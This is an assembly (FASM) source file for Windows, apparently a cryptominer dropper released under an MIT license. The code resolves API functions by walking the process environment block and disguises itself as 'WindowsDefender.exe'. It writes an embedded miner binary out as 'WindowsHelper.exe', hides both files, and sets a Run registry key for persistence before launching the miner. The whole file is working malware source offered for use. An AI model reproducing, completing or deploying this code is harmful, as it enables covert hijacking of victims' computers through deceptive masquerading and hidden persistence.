; MIT License
;
; Copyright (c) 2021 4B4DB4B3
;
; Permission is hereby granted, free of charge, to any person obtaining a copy
; of this software and associated documentation files (the "Software"), to deal
; in the Software without restriction, including without limitation the rights
; to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
; copies of the Software, and to permit persons to whom the Software is
; furnished to do so, subject to the following conditions:
;
; The above copyright notice and this permission notice shall be included in all
; copies or substantial portions of the Software.
;
; THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
; IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
; FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
; AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
; LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
; OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
; SOFTWARE.
; __         ______     ______     _____     ______     ______
;/\ \       /\  __ \   /\  __ \   /\  __-.  /\  ___\   /\  == \
;\ \ \____  \ \ \/\ \  \ \  __ \  \ \ \/\ \ \ \  __\   \ \  __<    4B4DB4B3
; \ \_____\  \ \_____\  \ \_\ \_\  \ \____-  \ \_____\  \ \_\ \_\
;  \/_____/   \/_____/   \/_/\/_/   \/____/   \/_____/   \/_/ /_/


format PE GUI 4.0
entry start

section '.b4db4b3' data readable writeable
        GetProcAddress dd ?

        lLib db 'LoadLibraryA', 0
        LoadLibrary dd ?

        krnl db 'kernel32.dll', 0
        kernel32 dd ?
        cpFile db 'CopyFileA', 0
        CopyFile dd ?

        gcProc db 'GetCurrentProcess', 0
        GetCurrentProcess dd ?

        cFile db 'CreateFileA', 0
        CreateFile dd ?

        wFile db 'WriteFile', 0
        WriteFile dd ?

        cHandle db 'CloseHandle', 0
        CloseHandle dd ?

        gmfName db 'GetModuleFileNameA', 0
        GetModuleFileName dd ?

        sfAttr db 'SetFileAttributesA', 0
        SetFileAttributes dd ?

        eProc db 'ExitProcess', 0
        ExitProcess dd ?


        adv db 'advapi32.dll', 0
        adv32 dd ?

        roKey db 'RegOpenKeyA', 0
        RegOpenKey dd ?

        rsVal db 'RegSetValueExA', 0
        RegSetValue dd ?

        rcKey db 'RegCloseKey', 0
        RegCloseKey dd ?


        shell db 'shell32.dll', 0
        shell32 dd ?

        sEx db 'ShellExecuteA', 0
        ShellExecute dd ?


        psapi db 'psapi.dll', 0
        hpsapi dd ?

        gmfnEx db 'GetModuleFileNameExA', 0
        GetModuleFileNameEx dd ?

        gmbName db 'GetModuleBaseNameA', 0
        GetModuleBaseName dd ?

        oper db 'open', 0 ; runas = administrator
        filename db 'WindowsHelper.exe', 0
        filename_loader db 'WindowsDefender.exe', 0
        fn_loader_size = $ - filename_loader
        autorun db 'Software\Microsoft\Windows\CurrentVersion\Run', 0
        keyname db 'WindowsDefender', 0

        param db 'your arguments for miner', 0

        hFile dd ?
        hKey dd ?

        mePath db 128 dup(0)
        mePath2 db 128 dup(0)

        miner file 'miner.bin'
        m_size = $ - miner

section '.b4db4b3' code readable executable
        init:
                mov edi, [fs:0x030]
                mov edi, [edi + 0x00c]
                mov edi, [edi + 0x014]
                mov edi, [edi + 0x00]
                mov edi, [edi + 0x00]
                mov edi, [edi + 0x10]

                mov [kernel32], edi

                mov edx, [edi + 0x3c]
                add edx, edi
                mov edx, [edx + 0x78]
                add edx, edi
                mov esi, [edx + 0x20]
                add esi, edi
                xor ecx, ecx

        searchProcAddr:
                inc ecx
                lodsd
                add eax, edi
                cmp dword[eax], 'GetP'
                jnz searchProcAddr
                cmp dword[eax + 0x4], 'rocA'
                jnz searchProcAddr
                cmp dword[eax + 0x8], 'ddre'
                jnz searchProcAddr


                mov esi, [edx + 0x24]
                add esi, edi
                mov cx, [esi + ecx * 2]
                dec ecx
                mov esi, [edx + 0x1c]
                add esi, edi
                mov edx, [esi + ecx * 4]
                add edx, edi
                mov [GetProcAddress], edx


                push lLib
                push edi
                call [GetProcAddress]
                mov [LoadLibrary], eax

                push adv
                call [LoadLibrary]
                mov [adv32], eax

                push shell
                call [LoadLibrary]
                mov [shell32], eax

                push psapi
                call [LoadLibrary]
                mov [hpsapi], eax




                push cpFile
                push edi
                call [GetProcAddress]
                mov [CopyFile], eax

                push gcProc
                push edi
                call [GetProcAddress]
                mov [GetCurrentProcess], eax

                push cFile
                push edi
                call [GetProcAddress]
                mov [CreateFile], eax


                push wFile
                push edi
                call [GetProcAddress]
                mov [WriteFile], eax

                push cHandle
                push edi
                call [GetProcAddress]

                push gmfName
                push edi
                call [GetProcAddress]
                mov [GetModuleFileName], eax


                push sfAttr
                push edi
                call [GetProcAddress]
                mov [SetFileAttributes], eax

                push eProc
                push edi
                call [GetProcAddress]
                mov [ExitProcess], eax




                push roKey
                push [adv32]
                call [GetProcAddress]
                mov [RegOpenKey], eax


                push rsVal
                push [adv32]
                call [GetProcAddress]
                mov [RegSetValue], eax

                push rcKey
                push [adv32]
                call [GetProcAddress]
                mov [RegCloseKey], eax


                push sEx
                push [shell32]
                call [GetProcAddress]
                mov [ShellExecute], eax



                push gmbName
                push [hpsapi]
                call [GetProcAddress]
                mov [GetModuleBaseName], eax

                push gmfnEx
                push [hpsapi]
                call [GetProcAddress]
                mov [GetModuleFileNameEx], eax




                ret

        start:  call init
                push 128
                push mePath
                push 0
                call [GetModuleFileName]

                call [GetCurrentProcess]

                push 128
                push mePath2
                push 0
                push eax
                call [GetModuleBaseName]

                xor ecx, ecx
        strcmp: inc ecx
                lea eax, [mePath2+ecx]
                lea ebx, [filename_loader+ecx]
                mov byte al, [eax]
                mov byte bl, [ebx]
                cmp ecx, fn_loader_size
                je succ_strcmp

                cmp al, bl
                jne err_strcmp
                jmp strcmp
        err_strcmp:
                push filename_loader
                push mePath
                call [CopyFile]

                push 0
                push 0
                push 0
                push filename_loader
                push oper
                push 0
                call [ShellExecute]

                push 0
                call [ExitProcess]
                ret

        succ_strcmp:
                push 0
                push 0
                push 1
                push 0
                push 0x00000002
                push 0x40000000
                push filename
                call [CreateFile]
                cmp dword[fs:0x34], 0x0
                jne skipWrite

                mov [hFile], eax

                push 0
                push 0
                push m_size
                push miner
                push [hFile]
                call [WriteFile]

                push [hFile]
                call [CloseHandle]

        skipWrite:
                push 4 or 2
                push filename
                call [SetFileAttributes]

                push 4 or 2
                push mePath
                call [SetFileAttributes]

                push hKey
                push autorun
                push 0x80000001
                call [RegOpenKey]

                xor ecx, ecx
        strlen: inc ecx
                lea eax, [mePath+ecx]
                mov byte al, [eax]
                cmp al, 0
                jne strlen

                push ecx
                push mePath
                push 0x00000001
                push 0
                push keyname
                push [hKey]
                call [RegSetValue]

                push 0
                push 0
                push param
                push filename
                push oper
                push 0
                call [ShellExecute]
        exit:
                push 0
                call [ExitProcess]
                ret